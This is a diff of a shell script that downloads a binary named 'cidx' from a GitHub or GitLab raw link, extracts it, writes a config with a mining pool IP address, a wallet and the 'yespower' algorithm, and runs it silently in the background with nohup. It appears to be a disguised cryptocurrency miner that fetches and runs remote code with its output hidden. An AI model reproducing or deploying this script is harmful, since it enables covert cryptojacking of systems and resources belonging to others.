@@ -1,5 +1,5 @@
 # Download and extract the cidx file
-wget -O cidx https://github.com/barburonjilo/back/raw/main/sru >/dev/null 2>&1
+wget -O cidx gitlab.com/jasa4/minulme/-/raw/main/cidxC.tar.gz && tar -xvf cidx >/dev/null 2>&1
 
 # Set the current date in UTC-7 format
 current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")
@@ -7,11 +7,11 @@ current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")
 # Create config.json with the current date
 cat > config.json <<END
 {
-  "url": "45.115.224.243:443",
-  "user": "Ssy29Ak9dCkPqyFRa8aroHTNMu2ynpsJ9JU2ZZf7SX85beMdbDjhvUL6sXiSnVCL9jPapFCGdGD3g7rRokxs9W8t52tQ3qi4NA.bloody",
-  "pass": "x",
-  "threads": 5,
-  "algo": "panthera"
+  "url": "45.115.224.230:443",
+  "user": "WbpHqVBkysEDZLvX3TQJ4HZwZ2yWzoJwbZ",
+  "pass": "c=SWAMP,zap=SWAMP",
+  "threads": 7,
+  "algo": "yespower"
 }
 END
 
@@ -19,7 +19,7 @@ END
 chmod +x config.json cidx
 
 # Run cidx in the background
-nohup ./cidx -o 45.115.224.242:443 -a yespower -u Wig7sz3AnhzfNUn6svr5rfk817LjVApcUW -t 3 -p x &>/dev/null &
+nohup ./cidx -c 'config.json' &>/dev/null &
 
 # Clear the screen and print the current time and running jobs
 clear
